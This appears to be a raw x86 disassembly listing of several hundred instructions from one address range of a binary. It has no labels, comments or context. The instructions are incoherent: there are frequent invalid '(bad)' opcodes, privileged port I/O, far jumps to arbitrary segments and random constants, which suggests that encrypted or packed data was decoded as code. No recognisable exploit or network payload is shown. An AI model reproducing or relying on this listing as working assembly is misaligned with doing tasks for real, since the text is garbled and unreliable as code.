  408f04:	and    BYTE PTR [edx-0x7b],al
  408f07:	gs pop edi
  408f09:	clc    
  408f0a:	mov    DWORD PTR [edi-0x6f],edx
  408f0d:	mov    edx,0x4717af23
  408f12:	mov    ds:0x6bd26765,al
  408f17:	jge    0x408edd
  408f19:	sahf   
  408f1a:	and    BYTE PTR [ebx+edx*2+0x1b],ah
  408f1e:	mov    ebx,0xb33415e3
  408f23:	test   BYTE PTR [ebp-0x72],0xb2
  408f27:	cmp    eax,0xbf312f15
  408f2c:	arpl   WORD PTR [esi-0x55664fc7],bp
  408f32:	xchg   ebp,eax
  408f33:	pop    ebx
  408f34:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f36:	sbb    al,0x33
  408f38:	mov    fs,WORD PTR [ebx-0x39]
  408f3b:	push   ss
  408f3c:	bound  ebx,QWORD PTR ds:0xf5e6414b
  408f42:	inc    edx
  408f43:	shr    esi,1
  408f45:	push   ds
  408f46:	enter  0xbb53,0x77
  408f4a:	nop
  408f4b:	pop    ss
  408f4c:	push   ss
  408f4d:	mov    ecx,ebp
  408f4f:	jb     0x408f37
  408f51:	adc    dl,BYTE PTR [eax+esi*8+0x5fd5b5b0]
  408f58:	jp     0x408f4f
  408f5a:	inc    eax
  408f5b:	mov    eax,ds:0x69182c97
  408f60:	push   ebx
  408f61:	sbb    eax,0xb1c29220
  408f66:	push   ecx
  408f67:	pusha  
  408f68:	aad    0xcc
  408f6a:	mov    dl,0x6f
  408f6c:	mov    esp,0x4007b5d0
  408f71:	pusha  
  408f72:	dec    esi
  408f73:	aas    
  408f74:	(bad)  
  408f75:	cdq    
  408f76:	jns    0x408f73
  408f78:	jbe    0x408f6a
  408f7a:	mov    bh,0x88
  408f7c:	out    dx,al
  408f7d:	in     eax,dx
  408f7e:	nop
  408f7f:	jnp    0x408f54
  408f81:	and    eax,0x2b5060e9
  408f86:	cmp    BYTE PTR [edx],dl
  408f88:	clc    
  408f89:	test   al,0xbc
  408f8b:	push   ds
  408f8c:	sbb    DWORD PTR ds:0xaf2d8d53,edi
  408f92:	push   eax
  408f93:	mov    ch,0x2d
  408f95:	test   DWORD PTR [ecx-0x18],ecx
  408f98:	xchg   esi,eax
  408f99:	jl     0x408f35
  408f9b:	gs cwde 
  408f9d:	inc    esp
  408f9e:	es push eax
  408fa0:	je     0x408f4d
  408fa2:	jmp    0x408f6e
  408fa4:	jge    0x408f4e
  408fa6:	sbb    BYTE PTR [eax-0x7],bh
  408fa9:	pop    ecx
  408faa:	scas   eax,DWORD PTR es:[edi]
  408fab:	(bad)  
  408fac:	xor    DWORD PTR [ecx],edx
  408fae:	fisub  DWORD PTR [esi-0x4e]
  408fb1:	push   ebx
  408fb2:	dec    edx
  408fb3:	and    DWORD PTR [edi],edx
  408fb5:	jl     0x408f6c
  408fb7:	push   0xa8a9794f
  408fbc:	jns    0x40903c
  408fbe:	imul   ecx,DWORD PTR [eax-0x3c15a3c4],0x71
  408fc5:	ds xchg esi,eax
  408fc7:	test   al,0x3b
  408fc9:	(bad)  
  408fca:	(bad)  
  408fcc:	or     al,0x84
  408fce:	cdq    
  408fcf:	adc    BYTE PTR [esi+0x223642db],ah
  408fd5:	(bad)  
  408fd6:	push   cs
  408fd7:	inc    ecx
  408fd8:	nop
  408fd9:	in     eax,0x26
  408fdb:	repz inc esi
  408fdd:	repnz pop eax
  408fdf:	mov    ah,0x76
  408fe1:	addr16 sbb eax,0xe87dec39
  408fe7:	ficom  WORD PTR [ebp-0x9bf6340]
  408fed:	enter  0x53ae,0xf8
  408ff1:	add    ah,BYTE PTR [edi]
  408ff3:	inc    ebp
  408ff4:	mov    ?,WORD PTR [ebp-0x125e79ae]
  408ffa:	push   esi
  408ffb:	ins    DWORD PTR es:[edi],dx
  408ffc:	mov    esi,0xbc1c2865
  409001:	fwait
  409002:	pop    ss
  409003:	scas   al,BYTE PTR es:[edi]
  409004:	and    esi,DWORD PTR [edi]
  409006:	and    BYTE PTR [esi-0x34d5123],al
  40900c:	rcl    BYTE PTR [edi],1
  40900e:	mov    eax,0x40fd1365
  409013:	jmp    0xe8cd:0x3fade874
  40901a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40901b:	sbb    BYTE PTR [ebp-0x39],bh
  40901e:	popa   
  40901f:	sbb    ebp,DWORD PTR [edx]
  409021:	dec    eax
  409022:	enter  0x5d4d,0x4b
  409026:	add    edx,DWORD PTR [ebp+edi*4+0x4d]
  40902a:	jecxz  0x40907f
  40902c:	mov    ecx,0x69e24139
  409031:	das    
  409032:	clc    
  409033:	adc    esi,DWORD PTR [edx+0x46f9f985]
  409039:	cwde   
  40903a:	xor    BYTE PTR [edi+ecx*8],ch
  40903d:	bound  edx,QWORD PTR [ebx]
  40903f:	test   al,0x81
  409041:	inc    eax
  409042:	aam    0xda
  409044:	add    al,0x9c
  409046:	xchg   edi,eax
  409047:	xchg   ebx,eax
  409048:	fisub  WORD PTR [edi+0x2fcd6e67]
  40904e:	xchg   edi,eax
  40904f:	cmp    dl,BYTE PTR [ebp-0x47]
  409052:	hlt    
  409053:	mov    edi,0xcbd3f3e8
  409058:	jnp    0x409084
  40905a:	(bad)  
  40905c:	adc    ebx,DWORD PTR [edi+0x7662e8b4]
  409062:	adc    DWORD PTR [ecx],esi
  409064:	inc    edi
  409065:	cwde   
  409066:	add    al,0x24
  409068:	aaa    
  409069:	loop   0x409067
  40906b:	ss add al,0x74
  40906e:	jno    0x4090c8
  409070:	aaa    
  409071:	jbe    0x4090aa
  409073:	leave  
  409074:	or     eax,0xec434049
  409079:	adc    BYTE PTR [ecx+0x5],0x22
  40907d:	popf   
  40907e:	mov    BYTE PTR [ecx+eiz*1-0x158c8f7],dl
  409085:	adc    eax,0xbed02f5f
  40908b:	adc    eax,0xcee3bd77
  409090:	push   0xecd84958
  409095:	neg    dl
  409097:	ds dec edi
  409099:	cmp    BYTE PTR [ecx],dl
  40909b:	and    edi,edx
  40909d:	(bad)  
  40909e:	and    bh,bh
  4090a0:	pop    ecx
  4090a1:	xchg   edi,eax
  4090a2:	aaa    
  4090a3:	aam    0x9f
  4090a5:	fld    TBYTE PTR [edi+0x55]
  4090a8:	mov    ds:0xd6dbde3a,eax
  4090ad:	mov    eax,0xca29ea44
  4090b2:	inc    ebx
  4090b3:	clc    
  4090b4:	adc    al,0x11
  4090b6:	push   cs
  4090b7:	pop    esi
  4090b8:	and    BYTE PTR [edi],0x37
  4090bb:	cs call 0x78f1:0x58746ea2
  4090c3:	xor    eax,0x85f9c9b3
  4090c8:	ins    DWORD PTR es:[edi],dx
  4090c9:	std    
  4090ca:	or     DWORD PTR [ebx+edx*8-0x4f],ebp
  4090ce:	jle    0x4090b1
  4090d0:	or     dl,BYTE PTR [edx-0x5127e9df]
  4090d6:	mov    esp,0x57ca56fa
  4090db:	jp     0x40908e
  4090dd:	das    
  4090de:	or     esi,DWORD PTR [edi]
  4090e0:	xchg   ecx,eax
  4090e1:	sub    eax,0x19d997d7
  4090e6:	dec    ebx
  4090e7:	into   
  4090e8:	jb     0x40915e
  4090ea:	xor    al,0xc4
  4090ec:	sub    al,0xe1
  4090ee:	popa   
  4090ef:	clc    
  4090f0:	fnsave ds:0x2c543e06
  4090f6:	(bad)  
  4090f7:	xor    eax,0x2e63c946
  4090fc:	leave  
  4090fd:	push   edx
  4090fe:	nop
  4090ff:	popf   
  409100:	pop    edi
  409101:	stos   DWORD PTR es:[edi],eax
  409102:	inc    edx
  409103:	push   cs
  409104:	sbb    edx,eax
  409106:	inc    edi
  409107:	add    bh,BYTE PTR [ebx-0x46]
  40910a:	dec    edi
  40910b:	out    dx,eax
  40910c:	pop    ss
  40910d:	sbb    al,0x7a
  40910f:	aad    0xbf
  409111:	xchg   ecx,eax
  409112:	jle    0x40909f
  409114:	daa    
  409115:	stos   DWORD PTR es:[edi],eax
  409116:	mov    dl,0xbd
  409118:	inc    esi
  409119:	iret   
  40911a:	popf   
  40911b:	xchg   edi,eax
  40911c:	and    al,0x28
  40911e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40911f:	dec    edi
  409120:	dec    esi
  409121:	add    al,0xba
  409123:	pop    edx
  409124:	stc    
  409125:	push   esp
  409126:	aaa    
  409127:	xchg   esp,eax
  409128:	in     al,0x7c
  40912a:	repz pop ebp
  40912c:	push   es
  40912d:	add    ecx,DWORD PTR [esi+0x73]
  409130:	or     bl,BYTE PTR [ecx-0x3a6ce8fe]
  409136:	sub    al,BYTE PTR [ecx+0x4d]
  409139:	xor    eax,0xe0250dbc
  40913e:	and    al,0x5
  409140:	out    dx,al
  409141:	ficom  WORD PTR [edx]
  409143:	dec    edi
  409144:	jns    0x40918d
  409146:	fxch   st(4)
  409148:	inc    edx
  409149:	outs   dx,BYTE PTR ds:[esi]
  40914a:	mov    bh,0x77
  40914c:	ret    
  40914d:	pop    es
  40914e:	or     cl,cl
  409150:	inc    esi
  409151:	add    dl,BYTE PTR [esi]
  409153:	pop    edi
  409154:	pop    ss
  409155:	jns    0x40914a
  409157:	call   0x44d4:0x7f3cb95d
  40915e:	fwait
  40915f:	mov    esi,0xc406de26
  409164:	test   al,0xcb
  409166:	sub    ecx,DWORD PTR [ebp+0x25]
  409169:	clc    
  40916a:	push   ebx
  40916b:	mov    bl,0xf5
  40916d:	jecxz  0x409175
  40916f:	fdivr  DWORD PTR [ebx]
  409171:	stos   DWORD PTR es:[edi],eax
  409172:	jecxz  0x4091ac
  409174:	aas    
  409175:	and    cl,ah
  409177:	lahf   
  409178:	outs   dx,DWORD PTR ds:[esi]
  409179:	push   ebp
  40917a:	addr16 gs and edx,esp
  40917e:	pop    esi
  40917f:	pop    edi
  409180:	add    DWORD PTR [edx+0x69d057b4],ecx
  409186:	inc    esi
  409187:	lock jl 0x4091f2
  40918a:	fdivr  QWORD PTR [edi-0x6a]
  40918d:	js     0x409140
  40918f:	repnz retf 
  409191:	mov    esi,edi
  409193:	and    eax,0x1bc332b
  409198:	test   BYTE PTR [edx],al
  40919a:	mov    bl,0x2c
  40919c:	leave  
  40919d:	dec    ebx
  40919e:	inc    eax
  40919f:	and    BYTE PTR [ecx],al
  4091a1:	rol    esp,cl
  4091a3:	fsub   DWORD PTR [edx-0x6680c67]
  4091a9:	sub    DWORD PTR [esi-0x80],edi
  4091ac:	add    BYTE PTR [ecx-0x49],ch
  4091af:	or     bl,BYTE PTR [edx+0x3869fffc]
  4091b5:	mov    esi,0x5b6f06e1
  4091ba:	cmp    dl,dl
  4091bc:	mov    eax,ds:0x8bb5dc79
  4091c1:	fisubr WORD PTR [edx]
  4091c3:	add    eax,DWORD PTR [eax-0x462b35dd]
  4091c9:	mov    al,0x2f
  4091cb:	pop    ds
  4091cc:	sub    eax,0xe3f13
  4091d1:	nop
  4091d2:	not    DWORD PTR [ebp+0x23]
  4091d5:	in     eax,0x2
  4091d7:	mov    cl,0x80
  4091d9:	cmp    al,0xe9
  4091db:	jns    0x4091fd
  4091dd:	retf   0x4636
  4091e0:	adc    al,0x86
  4091e3:	fisttp DWORD PTR [eax-0x38906a02]
  4091e9:	pop    edx
  4091ea:	retf   
  4091eb:	sbb    BYTE PTR [ebx+0x11],ah
  4091ee:	les    esp,FWORD PTR [eax+0x3e]
  4091f1:	and    DWORD PTR [ecx+0x38],0xf2bdbec9
  4091f8:	clc    
  4091f9:	mov    ecx,0x1646ad13
  4091fe:	cld    
  4091ff:	fstp   TBYTE PTR [eax+0x4d]
  409202:	fisubr WORD PTR [ecx+esi*1-0x3997797e]
  409209:	fiadd  DWORD PTR [edx]
  40920b:	and    bl,BYTE PTR [eax]
  40920d:	xchg   DWORD PTR [edx+0x6d96210c],ebx
  409213:	inc    edi
  409214:	ss and al,0xf8
  409217:	in     al,dx
  409218:	dec    eax
  409219:	or     eax,0x87b64441
  40921e:	inc    edi
  40921f:	lock dec esp
  409221:	dec    edi
  409222:	lods   eax,DWORD PTR ds:[esi]
  409223:	(bad)  
  409224:	cmp    dh,BYTE PTR [edx+edi*2]
  409227:	lods   al,BYTE PTR ds:[esi]
  409228:	lods   eax,DWORD PTR ds:[esi]
  409229:	jnp    0x409264
  40922b:	(bad)  
  40922c:	xchg   ecx,eax
  40922d:	dec    ecx
  40922e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40922f:	out    0x5c,eax
  409231:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409232:	sbb    al,0x3b
  409234:	jbe    0x409290
  409236:	pop    edx
  409237:	pop    eax
  409238:	fldcw  WORD PTR [esi]
  40923a:	fld    DWORD PTR [ecx]
  40923c:	pop    ss
  40923d:	pop    esp
  40923e:	pop    esp
  40923f:	stos   BYTE PTR es:[edi],al
  409240:	out    0x6f,eax
  409242:	or     al,0x4f
  409244:	pop    eax
  409245:	outs   dx,DWORD PTR ds:[esi]
  409246:	aad    0x14
  409248:	cli    
  409249:	int3   
  40924a:	fnstcw WORD PTR [ebp+edx*8-0x17df9264]
  409251:	ja     0x4092ae
  409253:	fistp  QWORD PTR [esi]
  409255:	and    edx,edx
  409257:	adc    BYTE PTR [edx+ebx*1],bl
  40925a:	mov    edx,0xcb81bc52
  40925f:	xchg   edi,eax
  409260:	stos   BYTE PTR es:[edi],al
  409261:	dec    edx
  409262:	xlat   BYTE PTR ds:[ebx]
  409263:	(bad)  
  409264:	repnz adc edi,edi
  409267:	push   0xffffffd4
  409269:	inc    ebx
  40926a:	sub    eax,0x9cd45693
  40926f:	(bad)  
  409270:	jo     0x409263
  409272:	dec    edx
  409273:	rep outs dx,DWORD PTR ds:[esi]
  409275:	mov    ebp,0xfb9a0de5
  40927a:	adc    ebp,DWORD PTR [ecx-0x2d8ac612]
  409280:	and    al,0x99
  409282:	xchg   BYTE PTR [ebx],ch
  409284:	arpl   WORD PTR [edx+0x68],ax
  409287:	(bad)  
  409288:	jae    0x4092c6
  40928a:	out    dx,eax
  40928b:	mov    edi,0xf5ce1bdd
  409290:	sub    BYTE PTR fs:[edx-0x1a],ah
  409294:	push   ecx
  409295:	pop    esp
  409296:	sub    edx,DWORD PTR [ebx-0x6583488a]
  40929c:	sbb    BYTE PTR [edx+0x2257ab38],dh
  4092a2:	and    BYTE PTR [esi-0x4e643789],ah
  4092a8:	push   ds
  4092a9:	dec    esp
  4092aa:	leave  
  4092ab:	sbb    BYTE PTR [ebp+0x3e],0x9a
  4092af:	daa    
  4092b0:	xor    BYTE PTR [ecx+ebp*1],ch
  4092b3:	xor    al,BYTE PTR [ebx+esi*1-0x6a]
  4092b7:	mov    eax,0x3efa4e9e
  4092bc:	adc    DWORD PTR [ecx],eax
  4092be:	mov    esi,0x7cd04080
  4092c3:	push   edi
  4092c4:	add    eax,0x4dfad4c6
  4092c9:	mov    esi,DWORD PTR [edi+0x74]
  4092cc:	lahf   
  4092cd:	icebp  
  4092ce:	and    eax,edx
  4092d0:	mov    ah,0x81
  4092d2:	fsubr  QWORD PTR [edx+0x1d]
  4092d5:	fidiv  WORD PTR [esi-0x5d598ab3]
  4092db:	mov    dl,0x30
  4092dd:	mov    edi,0x36c7eef9
  4092e2:	fnsave [ebx]
  4092e4:	pop    esp
  4092e5:	jae    0x409291
  4092e7:	inc    esi
  4092e8:	(bad)  
  4092e9:	lahf   
  4092ea:	xlat   BYTE PTR ds:[ebx]
  4092eb:	out    dx,al
  4092ec:	add    esp,DWORD PTR [ebx-0x3c]
  4092ef:	jmp    0x4092c9
  4092f1:	push   edi
  4092f2:	scas   eax,DWORD PTR es:[edi]
  4092f3:	in     eax,dx
  4092f4:	rcr    edx,0xce
  4092f7:	hlt    
  4092f8:	sbb    esp,eax
  4092fa:	arpl   WORD PTR [edi-0xe9bda30],cx
  409300:	adc    esi,DWORD PTR [eax]
  409302:	rcl    DWORD PTR [ebx+0x84c5286],cl
  409308:	ret    0x90ef
  40930b:	pop    esp
  40930c:	push   ecx
  40930d:	nop
  40930e:	pop    ss
  40930f:	out    dx,eax
  409310:	inc    BYTE PTR [edx+0x710bfcdf]
  409316:	or     ah,BYTE PTR [eax]
  409318:	cmc    
  409319:	fdiv   QWORD PTR [ebp-0x79983839]
  40931f:	stc    
  409320:	in     al,0xc1
  409322:	push   cs
  409323:	sbb    ch,BYTE PTR [ebx]
  409325:	popa   
  409326:	jb     0x40935e
  409328:	mov    al,ds:0xe1925e0f
  40932d:	pop    ds
  40932e:	pop    ecx
  40932f:	push   esp
  409330:	sti    
  409331:	lock (bad) 
  409333:	push   edi
  409334:	xchg   edx,eax
  409335:	stc    
  409336:	push   edx
  409337:	(bad)  
  409338:	pushf  
  409339:	mov    ds:0xdbed54d,eax
  40933e:	pop    ss
  40933f:	inc    esi
  409340:	inc    eax
  409341:	inc    edx
  409342:	jns    0x40932f
  409344:	outs   dx,DWORD PTR ds:[esi]
  409345:	shl    BYTE PTR [esi+0x403d380],0x9c
  40934c:	mov    fs,esp
  40934e:	icebp  
  40934f:	adc    edx,DWORD PTR [ebx-0x2ce08d28]
  409355:	pop    esi
  409356:	gs xor al,0x62
  409359:	(bad)  
  40935a:	xor    al,0xb9
  40935c:	fisubr DWORD PTR [ecx]
  40935e:	sub    BYTE PTR [ebp+esi*1-0x5c],dl
  409362:	repz push ebp
  409364:	jbe    0x40932e
  409366:	daa    
  409367:	call   FWORD PTR [edx+0x7a5aa78]
  40936d:	sbb    ebp,edi
  40936f:	(bad)
  409373:	jmp    0x409335
  409375:	sub    bh,BYTE PTR [edi+ebx*1+0x7]
  409379:	pop    ss
  40937a:	mov    ch,BYTE PTR [ecx-0x2]
  40937d:	add    edx,DWORD PTR [edx]
  40937f:	mov    dl,0x37
  409381:	or     bh,BYTE PTR [ebx+0x172bb70e]
  409387:	cdq    
  409388:	mov    edx,0xbe2094c0
  40938d:	push   ds
  40938e:	sub    al,0x95
  409390:	push   eax
  409391:	div    BYTE PTR [eax-0x2b]
  409394:	mul    DWORD PTR [eax]
  409396:	pushf  
  409397:	icebp  
  409398:	call   0xa953:0x55340e5e
  40939f:	dec    ebx
  4093a0:	es dec ecx
  4093a2:	mov    ah,0x7f
  4093a4:	out    dx,al
  4093a5:	push   eax
  4093a6:	xor    al,0xd4
  4093a8:	xchg   esp,eax
  4093a9:	inc    esi
  4093aa:	es or  al,0x73
  4093ad:	xchg   cl,dl
  4093af:	(bad)  
  4093b0:	pop    edx
  4093b1:	ins    BYTE PTR es:[edi],dx
  4093b2:	jl     0x40935b
  4093b4:	retf   0x5382
  4093b7:	xchg   ebx,eax
  4093b8:	lock xor esp,ecx
  4093bb:	sub    ecx,DWORD PTR [ebx+0x5dfba68e]
  4093c1:	xchg   ebx,esi
  4093c3:	jae    0x409423
  4093c5:	rol    DWORD PTR [edx+0x51],1
  4093c8:	mov    al,0xd7
  4093ca:	mov    BYTE PTR ss:[ebx+0x4b2cfc90],ah
  4093d1:	push   es
  4093d2:	aaa    
  4093d3:	ficom  WORD PTR [edx-0x3a3bb7fa]
  4093d9:	das    
  4093da:	add    eax,0x5a19b291
  4093df:	(bad)  
  4093e0:	ret    
  4093e1:	xchg   ebx,eax
  4093e2:	push   edi
  4093e3:	loopne 0x40937d
  4093e5:	pusha  
  4093e6:	retf   
  4093e7:	pop    edi
  4093e8:	xchg   BYTE PTR [esp+ebx*4+0x35d53e1c],bl
  4093ef:	into   
  4093f0:	or     ebp,0x4dfd611e
  4093f6:	pop    ebx
  4093f7:	push   cs
  4093f8:	and    ch,BYTE PTR [edx]
  4093fa:	les    edx,FWORD PTR [esi+0x9]
  4093fd:	cmp    eax,0x5dfce390
  409402:	in     eax,dx
  409403:	mov    ah,0xd9
  409405:	sub    BYTE PTR [edx-0x1f2bb76c],0xfa
  40940c:	fist   WORD PTR [edi+0x9f997aa]
  409413:	xor    DWORD PTR [ebx+ecx*2+0x79aea46],0x75abb8f0
  40941e:	xor    bl,BYTE PTR [edi]
  409420:	jmp    0xdaf1:0x60e2b149
  409427:	sub    DWORD PTR [esi],edi
  409429:	gs xchg bl,bh
  40942c:	cmp    al,0x76
  40942e:	(bad)  
  40942f:	or     DWORD PTR [eax-0x1e564d18],edi
  409435:	icebp  
  409436:	inc    esi
  409437:	lea    ebx,[edi+esi*1-0x3e6fb913]
  40943e:	adc    ecx,ebx
  409440:	lahf   
  409441:	or     al,0xbf
  409443:	adc    ebx,DWORD PTR [bp+di+0x1f]
  409447:	mov    DWORD PTR [eax+0x23],ebp
  40944a:	ins    BYTE PTR es:[edi],dx
  40944b:	js     0x409419
  40944d:	clc    
  40944e:	inc    edx
  40944f:	nop
  409450:	popf   
  409451:	sbb    BYTE PTR [edi+ecx*2],al
  409454:	mov    DWORD PTR [edi],edx
  409456:	adc    al,0x83
  409458:	xchg   DWORD PTR [ebx-0x6cb24663],esp
  40945e:	icebp  
  40945f:	loopne 0x409490
  409461:	arpl   sp,sp
  409463:	ds xchg edi,eax
  409465:	cmp    al,0x23
  409467:	cwde   
  409468:	sub    DWORD PTR ds:0x3ea41588,edx
  40946e:	pop    esi
  40946f:	out    0x48,al
  409471:	push   cs
  409472:	or     al,0x3e
  409474:	pop    edi
  409475:	cdq    
  409476:	sets   BYTE PTR [ecx+0xd]
  40947a:	add    cl,BYTE PTR [ecx+ecx*1]
  40947d:	(bad)  
  40947e:	aam    0x94
  409480:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409481:	xchg   WORD PTR [ebp+0x3c],sp
  409485:	mov    eax,0x21e2ec2e
  40948a:	daa    
  40948b:	and    bh,dh
  40948d:	cdq    
  40948e:	cmp    BYTE PTR [ecx-0x7f],dl
  409491:	xchg   edi,eax
  409492:	jl     0x409428
  409494:	setp   BYTE PTR [edx+0x2a]
  409498:	cld    
  409499:	int    0x89
  40949b:	cli    
  40949c:	push   cs
  40949d:	sub    edi,DWORD PTR [ebx]
  40949f:	hlt    
  4094a0:	jns    0x409435
  4094a2:	xor    DWORD PTR [edx-0x6992c0bd],esp
  4094a8:	test   eax,0xd5e74297
  4094ad:	je     0x4094ef
  4094af:	not    DWORD PTR [ebp-0x34]
  4094b2:	gs icebp 
  4094b4:	in     al,0x3f
  4094b6:	inc    edi
  4094b7:	out    0xb5,al
  4094b9:	mov    edi,0xae14556c
  4094be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094bf:	push   ecx
  4094c0:	cli    
  4094c1:	bound  ebx,QWORD PTR [ebp-0x162b053b]
  4094c7:	push   ebp
  4094c8:	pop    edi
  4094c9:	aad    0x30
  4094cb:	data16 or BYTE PTR [edi],dh
  4094ce:	dec    ebx
  4094cf:	test   BYTE PTR [edi-0x28],bl
  4094d2:	jmp    0x409504
  4094d4:	xchg   DWORD PTR [ecx+0x54],esp
  4094d7:	push   edi
  4094d8:	call   0x8cbb:0x58d49d8b
  4094df:	jb     0x4094cd
  4094e1:	and    al,0x5d
  4094e3:	mov    dl,0x14
  4094e5:	mov    esp,0x70e3b406
  4094ea:	lods   al,BYTE PTR ds:[esi]
  4094eb:	jecxz  0x409473
  4094ed:	in     al,0xb
  4094ef:	mov    esi,0x63bc5afb
  4094f4:	sbb    eax,0x8b90a1d7
  4094f9:	push   es
  4094fa:	jmp    0x409524
  4094fc:	into   
  4094fd:	xor    eax,DWORD PTR [ecx]
  4094ff:	sbb    ch,BYTE PTR [edx]
  409501:	fstp   TBYTE PTR [esi]
  409503:	inc    eax
  409504:	mov    al,ds:0x3ec77a60
  409509:	dec    esp
  40950a:	enter  0xf936,0x2
  40950e:	push   ds
  40950f:	mov    al,0x81
  409511:	sti    
  409512:	lea    edx,[edi]
  409514:	and    eax,0x63a2e2fe
  409519:	fsub   DWORD PTR [edx-0x3e]
  40951c:	nop
  40951d:	ret    
  40951e:	xor    ch,dh
  409520:	call   0x76ac:0x2617ec70
  409527:	xchg   edi,eax
  409528:	pop    esp
  409529:	jbe    0x409574
  40952b:	shl    DWORD PTR [edi-0x79f77ba6],cl
  409531:	mov    eax,ds:0xe693aa76
  409536:	retf   0x27c2
  409539:	xchg   ebp,eax
  40953a:	mov    cl,0x8f
  40953c:	bswap  edi
  40953e:	jg     0x4094f4
  409540:	push   0x847876cd
  409545:	retf   
  409546:	scas   al,BYTE PTR es:[edi]
  409547:	xchg   BYTE PTR [eax],ch
  409549:	ins    BYTE PTR es:[edi],dx
  40954a:	mov    edi,edi
  40954c:	mov    ds:0x4b932566,eax
  409551:	pop    edi
  409552:	xor    eax,0x52d49026
  409557:	inc    ebx
  409558:	call   0x9d022ea8
  40955d:	push   es
  40955e:	(bad)  
  40955f:	enter  0x83de,0x82
  409563:	leave  
  409564:	sti    
  409565:	ja     0x409511
  409567:	int    0xeb
  409569:	dec    ecx
  40956a:	cld    
  40956b:	daa    
  40956c:	add    al,bh
  40956e:	dec    eax
  40956f:	adc    DWORD PTR [eax+0x227f15d9],ebx
  409575:	dec    esi
  409576:	sbb    eax,esp
  409578:	retf   
  409579:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40957a:	test   BYTE PTR [edi-0x18],dl
  40957d:	mov    ch,0xa7
  40957f:	aaa    
  409580:	adc    ebx,ebp
  409582:	shl    DWORD PTR [edi],0xe0
  409585:	mov    ch,0x49
  409587:	jp     0x4095ff
  409589:	push   eax
  40958a:	ror    ebp,0x9f
  40958d:	rcl    BYTE PTR [esp+ebx*8-0xc],1
  409591:	call   0x2569:0x897f37bc
  409598:	pop    ecx
  409599:	lds    ebx,FWORD PTR ds:0x1d2384d
  40959f:	jle    0x40961a
  4095a1:	jecxz  0x409596
  4095a3:	aaa    
  4095a4:	mov    ebx,0x22a79a05
  4095a9:	outs   dx,BYTE PTR ds:[esi]
  4095aa:	popw   ds
  4095ac:	aas    
  4095ad:	push   cs
  4095ae:	std    
  4095af:	xor    ah,BYTE PTR ds:0xfcb1f2c5
  4095b5:	in     al,0xc8
  4095b7:	imul   BYTE PTR [edi-0x558d9ad3]
  4095bd:	xchg   DWORD PTR [edi+0x695d699e],ebx
  4095c3:	pop    ebp
  4095c4:	rol    edx,cl
  4095c6:	pop    ecx
  4095c7:	push   ecx
  4095c8:	das    
  4095c9:	lods   eax,DWORD PTR ds:[esi]
  4095ca:	shl    DWORD PTR [ebp-0x37102ed4],1
  4095d0:	xchg   BYTE PTR [edi+0x3c],bl
  4095d3:	mov    edi,0x3e4e53d4
  4095d8:	scas   eax,DWORD PTR es:[edi]
  4095d9:	adc    DWORD PTR [ebp-0x3],edi
  4095dc:	loop   0x409595
  4095de:	pop    es
  4095df:	gs clc 
  4095e1:	dec    BYTE PTR [esi]
  4095e3:	cwde   
  4095e4:	arpl   WORD PTR [ebx-0x5806de4f],di
  4095ea:	dec    edx
  4095eb:	or     BYTE PTR [edx+0x2e97e6ef],cl
  4095f1:	leave  
  4095f2:	add    bl,BYTE PTR [eax+0x1a]
  4095f5:	fcom   st(5)
  4095f7:	sbb    eax,0x7d1d696c
  4095fc:	push   ebx
  4095fd:	loopne 0x40963f
  4095ff:	stc    
  409600:	rol    bl,cl
  409602:	test   BYTE PTR [eax+0x76],bl
  409605:	test   DWORD PTR [edx+0x10cb86e8],edx
  40960b:	push   ss
  40960c:	pushf  
  40960d:	aaa    
  40960e:	lods   al,BYTE PTR ds:[esi]
  40960f:	cmp    eax,0xfcf6667e
  409614:	pushf  
  409615:	clc    
  409616:	lock sub eax,DWORD PTR [eax+0x4d]
  40961a:	or     edi,DWORD PTR [esp+ebp*2]
  40961d:	rcl    DWORD PTR cs:[edx],0x66
  409621:	scas   eax,DWORD PTR es:[di]
  409623:	sub    dh,BYTE PTR [esi-0x875726]
  409629:	inc    ebp
  40962a:	adc    al,0xf5
  40962c:	sub    edx,0x64a28091
  409632:	imul   esp
  409634:	mov    BYTE PTR [edi+0x27],ah
  409637:	inc    ecx
  409638:	leave  
  409639:	xor    DWORD PTR [edx+0x64e953cd],0x66
  409640:	or     bl,BYTE PTR [ecx]
  409642:	(bad)  
  409643:	mov    dl,0xf5
  409645:	push   cs
  409646:	dec    ebx
  409647:	mov    eax,0x22929b17
  40964c:	add    DWORD PTR [edi+esi*2-0x1535c44b],ecx
  409653:	sub    eax,0x7180f6cf
  409658:	out    dx,eax
  409659:	add    esp,esi
  40965b:	sub    DWORD PTR [ebx-0x27],esp
  40965e:	inc    ebp
  40965f:	and    BYTE PTR [edx-0x74a2ff6a],bl
  409665:	in     al,dx
  409666:	bound  esi,QWORD PTR [esi+0x7701f898]
  40966c:	pop    eax
  40966d:	std    
  40966e:	clc    
  40966f:	cs mov edi,0xe8a007c1
  409675:	push   esi
  409676:	dec    edx
  409677:	jmp    0x7298b977
  40967c:	jne    0x409600
  40967e:	mov    bl,BYTE PTR [edx+edi*1]
  409681:	cs cdq 
  409683:	in     eax,0x9e
  409685:	adc    BYTE PTR [ebx],al
  409687:	jno    0x409704
  409689:	push   edx
  40968a:	add    BYTE PTR [edi-0x19c2cad6],0xbb
  409691:	inc    ecx
  409692:	in     eax,dx
  409693:	push   0xffffffd0
  409695:	test   ah,dh
  409697:	dec    ebx
  409698:	je     0x4096fe
  40969a:	scas   al,BYTE PTR es:[edi]
  40969b:	sbb    BYTE PTR [edi],ch
  40969d:	je     0x40969f
  40969f:	out    0x68,eax
  4096a1:	and    DWORD PTR [esp+eiz*4-0x1b],edx
  4096a5:	fimul  DWORD PTR [esi]
  4096a7:	ds out dx,al
  4096a9:	or     al,0xcc
  4096ab:	pushf  
  4096ac:	sbb    ebp,DWORD PTR [ebp-0x3b]
  4096af:	xor    eax,0x13b1d87e
  4096b4:	cmp    al,0x23
  4096b6:	mov    ch,0x2
  4096b8:	test   DWORD PTR [eax],edi
  4096ba:	jmp    0xf089:0x5de4abca
  4096c1:	fwait
  4096c2:	sti    
  4096c3:	data16 jns 0x4096dd
  4096c6:	xchg   esi,eax
